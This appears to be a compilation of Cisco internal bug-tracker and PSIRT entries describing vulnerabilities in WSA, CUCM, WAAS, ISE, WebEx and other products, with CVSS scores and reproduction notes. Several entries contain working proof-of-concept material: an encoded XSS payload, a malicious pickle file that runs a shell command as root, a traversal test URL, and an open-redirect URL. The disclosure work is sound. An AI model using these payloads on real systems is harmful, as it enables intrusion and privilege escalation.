PSIRT: PSIRT-owner: jklimarc           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com.

Description: Finding ID:  WBX-CMR-17Class:  PatchingSeverity:  LowDifficulty:  HighThe servers with the IP addresses listed above are vulnerable to an early change cipherspec (CCS) attack (CVE-2014-0224) (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224) . In older versions of the OpenSSL library, a CCS message that is receivedunexpectedly during the TLS handshake will cause the session to be encrypted with predictablevalues. If both the client and the server are running vulnerable versions of OpenSSL, then a man in the middle attacker can use this attack to decrypt all intercepted communications.See attachment WBX-CMR-17 for more details

Title: Cisco Web Security Appliance (WSA) Drop Decrypt Policy Bypass Vulnerability
RNE: Symptom: A vulnerability in the ''Decrypt for End-User'' configuration parameter for Cisco AsyncOS  for Web Security Appliance (WSA) could allow an unauthenticated, remote attacker to connect  to a secure web site even if the WSA is configured to drop the connections this this site.  The secure connection is from the WSA to the web site over SSL or TLS.  The vulnerability is due to lack of complete input validation of the HTTP header. An attacker  could exploit this vulnerability by sending a crafted HTTP request through the WSA device.  An exploit could allow the attacker to connect to a web site which should not be allowed.  Conditions: The WSA is configured with HTTPS decryption to drop connections to certain sites. The ''Decrypt for End-User Notification'' is enabled under Security Services-HTTPS Proxy.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/4.1: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:P/I:N/A:N/E:F/RL:U/RC:C&version=2.0  CVE ID CVE-2016-9212 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: When the the HTTPS proxy is set to ;Decrypt for End-User Notification,; it is possible to connect to websites on HTTPS even if the they are set to ;Drop; in the Decryption Policy, as long as the host header is changed to reflect a site which is allowed in the policy.

Title: Cisco Nexus 7000 ARP Denial of Service (DoS) Vulnerability
RNE: Symptom: A vulnerability in the Address Resolution Protocol (ARP) input packet  processing of the Cisco Nexus Operating System (NX-OS) devices unauthenticated, adjacent attacker to cause a denial of service (DoS)  condition.  The vulnerability is due to improper input validation of the ARP packet and  the Maximum Transmission Unit (MTU) size which results in a buffer overflow  which can cause the DoS condition. An attacker could exploit this vulnerability  by sending a crafted ARP packet to the device. An exploit could allow the attacker  to cause the device to be unavailable due to a DoS condition of the ARP module.  Conditions: Device running with default configuration running an affected version of software.  Workaround: The MTU size should be configured lower.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 6.1/5.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:A/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-4323 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Cisco Security System CSRF Vulnerability
RNE: Symptom: A vulnerability in Cisco Security Manager (CSM) which could allow an unauthenticated, remote attacker to execute unwanted actions.  The vulnerability is due to Cross-Site Request Forgery (CSRF). An attacker could exploit this vulnerability by tricking the user of a web application into executing an adverse action.  Conditions: The Cisco CVP application Device running with default configuration running an affected version of software.  Workaround: With the CSM device the CSRF vulnerability can occur when there are multiple browser sessions open with one to the CSM and others to external websites. The CSRF could then occur if the user clicked a malicious link in one of the other browser sessions. For this reason it is recommend to only have a single browser session open the CSM , do the work required and the logout of the CSM and close the browser.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.9: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:N/E:POC/RL:U/RC:C&version=2.0 CVE ID CVE-2014-3267 has been assigned to document this issue. Title: CVE-2016-2183 Birthday attack against 64-bit block ciphers in TLS AKA SWEET32
RNE: Symptoms: Cisco TelePresence Server 7010 and MSE 8710, TelePresence Server on Multiparty Media 310 and 320, TelePresence Server on Multiparty Media 820 and TelePresence Server on Virtual Machine includes a version of the DES and Triple DES ciphers, as used in the TLS, SSH, and IPSec protocols that is affected by the vulnerabilities identified by the following Common  Vulnerability and Exposures (CVE) IDs:   CVE-2016-2183  This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: Not currently available.  Further Problem Description: Additional details about the vulnerabilities listed above can be found at  http://cve.mitre.org/cve/cve.html or https://nvd.nist.gov/vuln/detail/CVE-2016-2183  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.3: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2016-2183 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: Apache common collections library to be upgraded to the latest version
RNE: Symptom: Cisco WebEx Meetings includes a version of Java that is affected by the vulnerabilities identified by the following Common Vulnerability and Exposures (CVE) IDs:   CVE-2015-4852  This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: Not currently available.  Further Problem Description: Additional details about the vulnerabilities listed above can be found at http://cve.mitre.org/cve/cve.html  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4/3.3: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:H/Au:N/C:N/I:P/A:P/E:F/RL:OF/RC:C&version=2.0  CVE ID CVE-2015-4852 has been assigned to document this issue. Description: PLEASE READ THIS ENTIRE DESCRIPTION AND THE INCLUDED LINKS BEFORE TAKING ANY ACTION.This defect is to track investigation of the recently reported Apache commons library vulnerability, and its impact on Cisco Connected Analytics For Collaboration Sofware product.http://www.kb.cert.org/vuls/id/576313https://issues.apache.org/jira/browse/COLLECTIONS-580On November 6, 2015 a remote execution vulnerability that affects multiple releases of Apache Commons, was published by Foxglove Security Group. They claim that this issue was disclosed in January 2015. The report contained detailed proof of concept code for a number of applications including WebSphere Application Server, JBoss, Jenkins, OpenNDS and WebLogic. This is a remotely exploitable vulnerability and allows a hacker to inject any malicious code or execute any commands that exist on the server that can result in wide range of possibilities including stealing sensitive information. Apache Commons has developed a patch(would assume they will be issuing an official patch soon too). Patching affected systems is required; no ;work around; is available.This bug has been filed against Cisco Connected Analytics For Collaboration to address the vulnerability/ies known as Java_December_2015 and identified by CVE(s): CVE-2015-4852 INSTRUCTIONS:If your product ships with the vulnerable version of Java commons collection library you are required to:1. Assign the bug and CHANGE the severity from 7 to 2 (24 hours)2. Add the enclosure called ;Engineering Assessment; and describe what versions of your product are affected.3. Notify PSIRT of fixed version info and CCO release dates (7 days)If your product doesn't ship with a vulnerable version of Java commons collection library, please junk the bug.VERY IMPORTANT NOTE ABOUT SEVERITY: The bugs have been raised as *issue_not_a_bug_or_enhancement (Sev7)*, but PLEASE TREAT IT AS A SEV 2 bug.

Title: Cisco WebEx Meetings Server Arbitrary Password Change Vulnerability
RNE: Symptom: A vulnerability in Cisco WebEx Meetings Server could allow an authenticated, remote attacker to conduct arbitrary password changes against any non-administrative user.  The vulnerability is due to insufficient parameter string security. An attacker could exploit this vulnerability by creating a password protected meeting and utilize system provided parameters to change a non-administrative user password. A successful exploit could allow an attacker to change the password of a targeted user.  Conditions: A device running Cisco WebEx Meetings Server version 2.6 or any versions prior.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.4:  https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-3795 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Risk:  HighImpact: HighExploitability: MediumIdentifier:  NCC-FY16Q3-Orion-017OWASP Top 10:  A2 ? Broken Authentication and Session ManagementCategory:  CryptographyComponent:  User PortalThis defect has been updated by Pen Tester.  See enclosures  - Updated-NCC-FY16Q3-Orion-017 - Updated-NCC-FY16Q3-Orion-Appendix-D - Updated-NCC-FY16Q3-Orion-Appendix-E for updated copy of pen test detailsPlease refer to enclosure ;NCC-FY16Q3-Orion-017; for vulnerability details.Please refer to enclosure NCC-FY16Q3-Orion-Appendix-B & NCC-FY16Q3-Orion-Appendix-C for reference.ImpactAn attacker can change the password of any non administrative user. The attacker can then log into the user's account to access sensitive information, such as recordings or contact details of the user.DescriptionThe endpoint /orion/updatePw is used during the forgot password process in order to change a user's password. This endpoint accepts an encryptedUserID parameter which can be used to specify which user to reset the password of. The encryptedUserID parameter is decrypted via a call to SecurityHelper.decrypt(String input).The endpoint /orion/meeting/verifyInfoPw can be used to verify the password of a meeting.  If the supplied meeting identifier and meeting password matches, the password of the meeting is encrypted and returned in the result. The password is encrypted via a call to SecurityHelper.wbsEncrypt(String input). The value produced by SecurityHelper.wbsEncrypt() can be passed to SecurityHelper.decrypt(),since both functions use the same keys and encryption/decryption algorithm.

Title: Snort attack recognition problem with obfuscated %5C sig over SSL.
RNE: Symptom: HTTP based attacks embedded in SSL traffic are not detected. The traffic is HTTP over SSL (HTTPS) and the sensing device is  configured to decrypt the SSL connection and detect HTTP based attacks associated  to Snort Intrusion Detection rules.  Conditions: * Configure an SSL Policy with a ''Known Key'' action for the related SSL/HTTPS traffic.  * The HTTP variables and pre-processors are set to trigger for HTTP traffic on port 443/tcp. TCP port 443 is     for SSL.  * The HTTP based attack is triggering for HTTP traffic but not for SSL/HTTPS.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 5/4.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:N/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0 CVE ID CVE-2015-6427 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: Update 9 Jun, kasperjk:There is only one signature, %5C, that exhibits this issue, and only with certain sensor configuration options.   See ;A-comments-reassign; for details.Original:HTTP based attacks embedded in SSL traffic not detectedAfter configuring correctly the SSL Policy, the HTTP variables and pre-processors, and having the HTTPS traffic decrypted with a ;Known Key;, the HTTP attacks embedded in this traffic are not detected by the corresponding Intrusion Policy.In comparison to the undetected HTTPS attacks, the following test URL triggers correctly the Intrusion rule when using the HTTP protocol without SSL encryption:Test URL HTTP: http://<Web Server>/TEM/%5C../web-console/Test URL HTTPS: https://<Web Server>/TEM/%5C../web-console/Rule triggering the test URL in HTTP only:SID: 1:17391:13Name: ;SERVER-APACHE Apache Tomcat UNIX platform backslash directory traversal;Content:alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:;SERVER-APACHE Apache Tomcat UNIX platform backslash directory traversal;; flow:to_server,established; content:;/%5C..;; fast_pattern:only; content:;/%5C..;; http_raw_uri; metadata:policy max-detect-ips drop, service http; reference:bugtraq,22960; reference:bugtraq,67244; reference:cve,2007-0450; reference:cve,2014-0130; reference:url,tomcat.apache.org/tomcat-6.0-doc/changelog.html; reference:url,weblog.rubyonrails.org/2014/5/6/Rails_3_2_18_4_0_5_and_4_1_1_have_been_released/; classtype:web-application-attack; sid:17391; rev:13; )

Title: Cisco ASA Software Internet Key Exchange Version 1 XAUTH Denial of Service Vulnerability
RNE: Symptoms: A vulnerability in the Internet Key Exchange Version 1 (IKEv1) XAUTH code of Cisco ASA Software could allow an authenticated, remote attacker to cause a reload of an affected system.  The vulnerability is due to insufficient validation of the IKEv1 XAUTH parameters passed during an IKEv1 negotiation. An attacker could exploit this vulnerability by sending crafted parameters.  Note: Only traffic directed to the affected system can be used to exploit this vulnerability. This vulnerability only affects systems configured in routed firewall mode and in single or multiple context mode. This vulnerability can be triggered by IPv4 or IPv6 traffic. A valid IKEv1 Phase 1 needs to be established to exploit this vulnerability, which means that an attacker would need to have knowledge of a pre-shared key or have a valid certificate for phase 1 authentication.  Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170419-asa-xauth  Conditions: See security advisory  Workaround: See security advisory  Further Problem Description:  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 7.7: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-6610 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: IKEv1 VPN connections can cause a crash. Originally it was thought to be a specific device but we seemed to actually prove it would follow a specific username onto multiple client devices.When the username authenticates the ASA crashes with the following traceback:   Cisco Adaptive Security Appliance Software Version 9.1(7)   Compiled on Thu 14-Jan-16 09:37 by builders   Hardware:   ASA5510   Crashinfo collected on 07:58:47.947 EDT Wed Mar 16 2016   Traceback:   0: 0x08063660 <snap_mini_dump+160 at finesse/snap.c:694>   1: 0x080636a1 <snap_dump+49 at finesse/snap.c:2154>   2: 0x08065865 <snap_handler+517 at finesse/snap.c:2473>   3: 0x08f00a62 <lina_sigcrash+802 at lina/linux/lina.c:2365>   4: 0xffffe410   5: 0x0865b09e <fsmUtil_saveUsername+110 at ikev1/fsm_util.c:174>   6: 0x086ca723 <process_attr+3667 at ikev1/transaction.c:947>   7: 0x086a8094 <process+388 at ikev1/process.c:178>   8: 0x086bdd9e <IKETM_ProcessMsg+126 at ikev1/tmact.c:4795>   9: 0x098b643e <FSM_SMDriver+446 at infra/src/fsmd.c:290>   10: 0x08656a3b <IKEFSM_Handler+59 at ikev1/fsmact.c:229>   11: 0x08665005 <IKEProcessMsg+213 at ikev1/ike_daemon.c:1238>   12: 0x08668030 <IkeDaemon+144 at ikev1/ike_daemon.c:448>   13: 0x0806a2ac <t_start+92 at finesse/thread.c:314>This only happens from Android clients - the same username from a Mac or iPhone does not crash the ASA.Based on notes in CSCuu39636, the fix for CSCur88829 added a new function fsmUtil_saveUsername() to store username from certificate in code. Its interesting to me that function is being called here because I don't see any certificate authentication enabled on any of the tunnel groups. The authentication is username and password based.My guess is that the Android device pads the username incorrectly if its smaller than a certain value and the ASA crashes upon reading something it doesn't expect.

Title: Cisco Unified Communications Manager Cross Site Scripting Vulnerability
RNE: Symptom: A vulnerability in the web-based management interface of Cisco Unified Communications Manager could allow an authenticated, remote attacker to conduct a reflected cross-site scripting (XSS) attack  against a user of the web-based management interface of an affected device.  The vulnerability is due to insufficient validation of user-supplied input by the web-based management interface of an affected device. An attacker could exploit this vulnerability by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script  code in the context of the interface or allow the attacker to access sensitive browser-based information.  Conditions: Device running with default configuration running an affected version of software.  Workaround: The ''Cisco Location Bandwidth Manager'' can be enabled to workaround this vulnerability.  Further Problem Description: Additional information about XSS attacks and potential mitigations can be found at:  http://www.cisco.com/en/US/products/cmb/cisco-amb-20060922-understanding-xss.html https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 4.1: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-3888 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: CUCM: ;Topology; page is vulnerable to reflected XSS attackDuring an internal test, it was found that CUCM is vulnerable to XSS attack at ;Topology; page.Following is the malicious HTTP POST request that was used to reproduce the vulnerability.POST /ccmservice/toporeport.do?reqType=loc_topo_download HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoReferer: https://10.77.45.130/ccmservice/locationcactopologyreport.jsp;jsessionid=4898D5F55E2DC2843E47E16BB17EE13ACookie: JSESSIONID=8C83E68122417A6E39BD089EC8B104AE; JSESSIONIDSSO=11237FA5750A9C0EACFD26194389F6B0Host: 10.77.45.130Content-Length: 248Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-USContent-Type: application/x-www-form-urlencodedsearchCriteria=begins&searchValue=%22onmouseover%3D%22%5Bwindow%5B%27location%27%5D%3D%27%5Cx6a%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx3a%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%5Cx281379%5Cx29%27%5D%22&noOfRows=50&tableEmpty=true&numpage=1Attached the screensot in the Enclosures tab to show a proof of an alert box generated.Note: To reproduce the vulnerability the ;Cisco Location Bandwidth Manager; service must be turned off;.Payload used to reproduce the issue: ;onmouseover=;[window['location']='\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x281379\x29'];

Title: Commands Injection Vulnerability in multiple Cisco TelePresence Products
RNE: Symptom: A vulnerability in the web framework of multiple Cisco TelePresence products could allow an authenticated, remote attacker to inject arbitrary commands that are executed with the privileges of the root user.  The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by authenticating to the device and submitting crafted input to the affected parameter in a web page. Administrative privileges are required in order to access the affected parameter. A successful exploit could allow an attacker to execute system commands with the privileges of the root user.  Cisco has released free software updates that address this vulnerability. Workarounds that mitigate this vulnerability are not available. This advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20150513-tp   Conditions: See published Cisco Security Advisory  Workaround: See published Cisco Security Advisory  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS sscores as of the time of evaluation are 9.0/7.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-0713 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html

Title: TUNNEL_INFO & TUNNEL_STATUS pickle files cause arbitrary code execution
RNE: Symptoms: A vulnerability in the status checking process of support remote access tunnels in the Cisco Web Security Appliance (WSA) could allow an authenticated, local attacker to execute arbitrary Python code on the targeted system.  The vulnerability is due to improper usage and handling of the pickle Python module by the affected software. An attacker could exploit this vulnerability by submitting a crafted pickle file to a targeted device. A successful exploit could be used to conduct further attacks.  Conditions: Device configured with default configuration.  Workaround: None.  Further Problem Description: Exploit requires authenticated access to WSA in order to be carried out.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 6.6/5.9: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:M/Au:S/C:C/I:C/A:C/E:POC/RL:U/RC:C&version=2.0 CVE ID CVE-2015-0692 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The WSA uses a pickle file to check the status of the support remote access tunnel.  This file is called TUNNEL_INFO and is stored in the admin user's home directory.Pickle and cPickle introduce the ability to execute arbitrary Python code.  A malicious pickle file will cause the WSA to run Python code in the context of the root user.  Given the ability to write to the admin user's folder (for example, simply breaking out of the CLI environment), a user could escalate to root privileges on the WSA.If the user has invoked the 'techsupport' command, the attack may take onlyseconds.  Otherwise, it will require the user to run the 'techsupport' command.After the attack has occurred, it will be difficult for the customer to recover.The only way for a normal user to replace the 'TUNNEL_INFO' file is to use the'techsupport' command.  Unfortunately, the 'techsupport' command crashes whileloading the TUNNEL_INFO file (with a ;TypeError: 'int' object is unscriptable;).Since customers don't have shell access, the WSA will continually run the codein the malicious pickle file.Steps to reproduce:1) Logged in as admin, from a standard csh shell on a stock WSA, changedirectory to /data/home/admin.2) Create the TUNNEL_INFO pickle file that will create an empty file in alocation where only the root user has privileges:cat >TUNNEL_INFO <<EOLcossystem(S'touch /data/vulnerable'tR.EOL3) Check the /tmp folder for the 'vulnerable' file.  If it's not there, just run the 'techsupport' command.The solution to this issue is to remove the dependence on Pickling, as the pickle module is inherently vulnerable to code execution.  Using JSON wouldbe a drop-in replacement for pickle and remove the potential for codeexecution.
PSIRT: PSIRT-owner: rosalaza           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com.

Title: Cisco Wide Area Application Services Central Manager Information Disclosure Vulnerability
RNE: Symptom: A vulnerability in the web-based GUI of Cisco Wide Area Application Services (WAAS) Central Manager could allow an unauthenticated, remote attacker to retrieve completed reports from an affected system.  The vulnerability is due to a processing error in how the affected software applies role-based access control (RBAC) to URLs. An attacker could exploit this vulnerability by conducting a brute-force attack or guessing the report ID of a completed report and sending a crafted HTTP GET request with the ID to an affected system. A successful exploit could allow the attacker to download any completed report that was previously scheduled by a WAAS administrator via the Reports Central area in the WAAS Central Manager GUI of the affected system.  There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170705-waas1  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.3: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6730 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: The software version that I have tested is v6.2.3b b22.The issue that I have identified is with the scheduled reporting functionality.An unauthenticated user is able to retrieve PDF and CSV reports from the Central Manager if they are able to guess (or are given) report primary key IDs.e.g. Given a report primary key ID of 58113, an unauthenticated user is able to retrieve a zip file containing the report in CSV format using the following URL:https://1.1.1.1:8443/CM_Reports/58113/statistics.ziphttps://1.1.1.1:8443/CM_Reports/<primaryKey>/statistics.zip This report could contain information such as internal device hostnames, IP addresses, and WAN optimisation statistics.PDF reports are more difficult to retrieve, as part of the URL used to get them is the report's name, which may be more difficult to guess than the ID:https://1.1.1.1:8443/CM_Reports/58113/Akamai%20Connect%20Monthly%20-%20M_WAAS_58113.pdfhttps://1.1.1.1:8443/CM_Reports/<primaryKey>/<reportName>_WAAS_<primaryKey>.pdfThe above <primaryKey> and <reportName> can be found (by an authenticated user) in the JSON on the line beginning with:;var scheduleForm_j_idt20_store = new cm.table.ItemFileWriteStore?from the URL :https://1.1.1.1:8443/Monitor/scheduleDashboard.xhtmlAn easier way to view this JSON is: curl -s -k -b $'JSESSIONID=<sessionId>' $'https://1.1.1.1:8443/Monitor/scheduleDashboard.xhtml' | egrep -o ;\[.*\{\;completedTimeInMillis\;:.*\]; | python -m json.toolWhere ?<sessionId>? is an authenticated administrator's session ID.These CSV and PDF report URLs should be inaccessible to unauthenticated users.-----Update: In version 4.x only the PDF report can be retrieved; downloading the CSV reports requires authentication in WAAS 4.x.
PSIRT: PSIRT-owner: rosalaza           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs. Title: Cisco ISE Guest Portal Login Limit Bypass
RNE: Symptom: A vulnerability in the Guest Portal login page of Cisco Identity Services Engine (ISE) could allow an unauthenticated, remote attacker to perform multiple login attempts in excess of the configured login attempt limit.  The vulnerability is due to insufficient server-side login attempt limit enforcement. An attacker could exploit this vulnerability by sending modified login attempts to the Guest Portal login page. An exploit could allow the attacker to perform brute-force password attacks on the ISE Guest Portal.  There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171115-ise  Conditions: Default installation of an affected release of ISE.  Workaround: None.  Further Problem Description: PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.3: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-12316 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: This issue was reported by an external entity:We evaluated a customer who uses the Cisco solution (ISE) as ;captive portal; used in wireless network where the users are shown a welcome message informing them of the conditions of access.- I confirmed, the ISE login window disables the ;send; button after 06 attempts.- But, when I performed the analysis of the ISE web portal login, I was able to confirm that it is possible to perform brute force attacks against the authentication window of the Cisco Identity Services Engine (ISE).- This I have confirmed, using ;burp-proxy; where I have been able to find a valid credential, after 50 attempts.Screenshots attached.

Title: VOSS - Open URL Redirection
RNE: Symptom: A vulnerability in the Cisco Unified Communications Domain Manager (CUCDM) which is part of Cisco Hosted  Collaboration Solution (HCS) web interface which could allow an authenticated, remote attacker to redirect a  user to a undesired web page.    The vulnerability is due to improper input validation of the parameters of the HTTP request.   An attacker could exploit this vulnerability by crafting a HTTP request which could  cause the web application to redirect the request to a specified malicious Uniform  Resource Locator (URL). This vulnerability is known as an Open Redirect Attack and used  in phishing attacks to get users to visit malicious sites without their knowledge.  Conditions: Device running with default configuration running an affected version of software.  Workaround: None.  Further Problem Description: More information can be found at:  https://cwe.mitre.org/data/definitions/601.html  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 3.5/3.3: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:S/C:N/I:P/A:N/E:F/RL:U/RC:C&version=2.0 No CVE ID has been assigned to this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description:
VOSS bug 24211A page within the administration section of VOSS made use of a parameter taken from the URL of the request as the location for a redirect response. This leads to a situation in which a URL which appears to be associated with VOSS, and therefore trustworthy to regular users, could in fact be used to redirect the user to a site under the control of an attacker. This type of vulnerability is often used to launch site impersonation, or phishing, attacks, in which unsuspecting users are lured to malicious sites with legitimate-seeming links. The attacker is then free to present the user with what appears to be genuine VOSS content, in an attempt, for example, to capture authentication credentials.https://cucdm.cisco.com/LOGINBVSM?usergroup=&destination=attacker_url_here&credential_0=test&credential_1=test HTTP/1.1 The response from the server would be:HTTP/1.1 302 Found Server: nginx Date: Thu, 06 Aug 2015 09:56:35 GMT ...... Pragma: no-cache Location: attacker_url_here Content-Length: 211 Expires: Thu, 06 Aug 2015 09:56:35 GMT Cache-Control: private Strict-Transport-Security: max-age=31536000 302 Found

Found

The document has moved here.

Recommendation: The destination of the redirection request should be examined on the server side to ensure that it falls within the scope of the application. Any requests that do not meet this requirement should be logged, with a suitable error message being returned to the user.

Title: Cisco Meeting Server Malformed H.264 Denial of Service Vulnerability
RNE: Symptom: A vulnerability in the H.264 decoder function of Cisco Meeting Server could allow an unauthenticated, remote attacker to cause a Cisco Meeting Server media  process to restart unexpectedly when it receives an illegal H.264 frame.  The vulnerability is triggered by an H.264 frame that has an invalid picture parameter set (PPS) value. An attacker could exploit this vulnerability by sending a  malformed H.264 frame to the targeted device. An exploit could allow the attacker to cause a denial of service (DoS) condition because the media process could  restart. The media session should be re-established within a few seconds, during which there could be a brief interruption in service.  There are no workarounds that address this vulnerability.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171115-cms  Conditions: The default configuration of the application.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:L/E:X/RL:X/RC:X  CVE ID CVE-2017-12311 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
